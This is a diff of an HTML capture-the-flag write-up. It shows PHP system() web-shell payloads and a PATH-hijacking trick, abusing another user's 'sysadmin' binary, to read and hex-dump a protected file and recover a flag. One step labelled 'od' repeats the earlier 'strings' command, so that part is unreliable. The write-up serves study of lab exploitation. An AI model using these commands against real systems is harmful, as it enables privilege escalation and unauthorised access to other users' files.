@@ -68,28 +68,23 @@
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;ls -al /home/ctf_user3&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
 </code></pre></div>
 
-
 <p>It looks like ctf_user2 owns <code>image.txt</code> and <code>RAnd0m</code>. Hovewer, neither concatenating the content of <code>image.txt</code> nor running the <code>RAnd0m</code> executable bring anything useful.</p>
 <p>Let's try to inspect the binary then with the good ol' <code>strings</code></p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;echo &quot;strings /home/ctf_user3/RAnd0M&quot; &gt; /tmp/date &amp;&amp; chmod 777 /tmp/date &amp;&amp; export PATH=/tmp:$PATH &amp;&amp; /home/ctf_user2/sysadmin&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
 </code></pre></div>
 
-
 <p>No luck. What about <code>od</code> then?</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;echo &quot;strings /home/ctf_user3/RAnd0M&quot; &gt; /tmp/date &amp;&amp; chmod 777 /tmp/date &amp;&amp; export PATH=/tmp:$PATH &amp;&amp; /home/ctf_user2/sysadmin&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
 </code></pre></div>
-
 
 <p>Well that worked. Now I only need to figure out how to get out a proper hexdump from it. After a bit of digging, the <code>man</code> page comes to the rescue and provides with the syntax I need.</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;echo &quot;od -A x -t x1z -v /home/ctf_user3/RAnd0M&quot; &gt; /tmp/date &amp;&amp; chmod 777 /tmp/date &amp;&amp; export PATH=/tmp:$PATH &amp;&amp; /home/ctf_user2/sysadmin&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
 </code></pre></div>
 
-
 <p>Let's copy the hex dump into a txt file in my machine, recreate the binary and finally run <code>strings</code> on it</p>
-<div class="highlight"><pre><span></span><code><span class="err">xxd -r -p rand.txt out.bin</span>
-<span class="err">strings out.bin</span>
+<div class="highlight"><pre><span></span><code>xxd -r -p rand.txt out.bin
+strings out.bin
 </code></pre></div>
-
 
 <p>One of the strings seems to match the flag pattern <code>pvkq{dbiH._dy_pvkqH.E.H.U.H._wo_?}</code>.</p>
 <p>Running it through a <a href="http://theblob.org/rot.cgi?">ROT decoder</a> gives me <code>flag{tryX._to_flagX.U.X.K.X._me_?}</code>. Since the flag doesn't look too right and the system doesn't accept anyway, let's assume I probably messed up something while tinkering with <code>od</code> and manually fix it: <code>flag{try_to_flag_me_?}</code>.</p>
